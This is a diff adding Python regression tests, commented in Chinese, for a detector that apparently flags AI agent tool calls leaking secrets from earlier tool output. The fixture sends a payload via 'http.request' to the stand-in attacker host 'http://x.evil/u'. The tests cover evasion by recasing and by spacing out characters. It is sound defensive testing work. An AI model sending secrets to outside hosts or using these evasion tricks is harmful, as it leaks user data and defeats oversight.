@@ -60,6 +60,33 @@ def test_no_taint_when_payload_unrelated() -> None:
     assert "chain.exfiltration" in kinds  # 但顺序模式(敏感读取→外发)仍命中
 
 
+def _taint_hit(ret: str, payload: str) -> bool:
+    """便捷:返回内容 ret 是否被判为外发 payload 的污点源(经 SequenceChainAnalyzer)。"""
+    ctx = Context(session_id="s", tool_returns=[ret])
+    send = ToolIntent(
+        session_id="s",
+        tool_name="http.request",
+        arguments={"url": "http://x.evil/u", "payload": payload},
+    )
+    ctx.request_trace = [send]
+    return any(f.kind == "chain.taint_exfiltration" for f in _analyze(ctx))
+
+
+def test_taint_catches_unaligned_verbatim_substring() -> None:
+    # 回归:此前步长 4 跳采,起点 i=3 的连续片段永不比对 → 字面子串原样外发却漏判。
+    assert _taint_hit("abcSECRETDATA99X", "q=SECRETDATA99")
+
+
+def test_taint_catches_case_variation() -> None:
+    # 归一化(casefold):大小写改写不再能规避。
+    assert _taint_hit("SecretToken_ABCDEF123456", "secrettoken_abcdef123456")
+
+
+def test_taint_catches_whitespace_injection() -> None:
+    # 归一化(去空白):字符间插空格不再能规避。
+    assert _taint_hit("LEDGER-ABCDEF-7788", "L E D G E R - A B C D E F - 7 7 8 8")
+
+
 def test_pipeline_records_tool_returns_for_taint() -> None:
     load_builtin_capabilities()
     pipe = SecurityPipeline(
